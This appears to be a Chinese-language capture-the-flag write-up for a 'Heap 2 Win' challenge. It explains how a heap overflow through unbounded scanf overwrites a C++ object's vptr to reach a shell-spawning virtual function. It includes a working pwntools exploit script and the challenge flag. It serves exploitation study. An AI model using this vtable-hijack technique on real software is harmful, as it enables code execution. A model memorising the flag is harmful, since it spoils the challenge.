# Heap 2 Win

## 题目简述

程序用 C++ 多态类实现按钮。`Button` 有虚函数 `push()`，`WinnerButton::push()` 会执行 `/bin/sh`；程序在启动时创建一个 `WinnerButton`，但不把它加入可选按钮列表。`CustomButton` 内只有 16 字节的 `name`，构造函数却使用无长度限制的 `scanf("%s", name)`，造成堆溢出。

决定性机制是 C++ 对象首地址保存 vptr。覆盖相邻按钮对象的 vptr，使其指向 `WinnerButton` 的 vtable，随后对该对象调用虚函数即可跳转到 `WinnerButton::push()`。

## 解题过程

对象布局可概括为：

```text
CustomButton:
  +0x00  vptr
  +0x08  name[0x10]

HypeButton:
  +0x00  vptr
```

先创建两个 `HypeButton`，再创建一个 `CustomButton`。在分发二进制的分配顺序中，`std::vector` 扩容留下的堆块和按钮对象形成了可稳定利用的相邻布局；从 `CustomButton::name` 写入 0x18 字节后，下一指针位置正好覆盖列表中第二个 `HypeButton` 的 vptr。

二进制未启用 PIE，官方脚本使用固定的 `WinnerButton` vtable 地址 `0x403640`：

```python
from pwn import *

p = process("./heap2win")
winner_vtable = p64(0x403640)

def make(kind, name=None):
    p.sendlineafter(b">> ", b"1")
    p.sendline(str(kind).encode())
    if name is not None:
        p.sendlineafter(b"button!\n", name)

make(1)  # HypeButton 1
make(1)  # HypeButton 2
make(2, b"A" * 0x18 + winner_vtable)

p.sendlineafter(b">> ", b"2")
p.sendline(b"2")
p.interactive()
```

第二个按钮仍由程序按 `Button*` 调用，但虚函数派发已经沿伪造 vptr 进入 `WinnerButton::push()`，最终得到：

```text
byuctf{y34h,..._you're_a_pro}
```

## 方法总结

- 核心技巧：以堆溢出覆盖相邻 C++ 对象的 vptr，复用已有类的 vtable 实现虚调用劫持。
- 识别信号：虚函数类、对象位于堆上、成员数组使用无界字符串输入，以及程序内存在高权限派生类。
- 复用要点：vtable 地址和堆邻接关系都必须在目标二进制中动态确认；利用依赖对象首字段是 vptr，而不是覆盖普通函数指针。
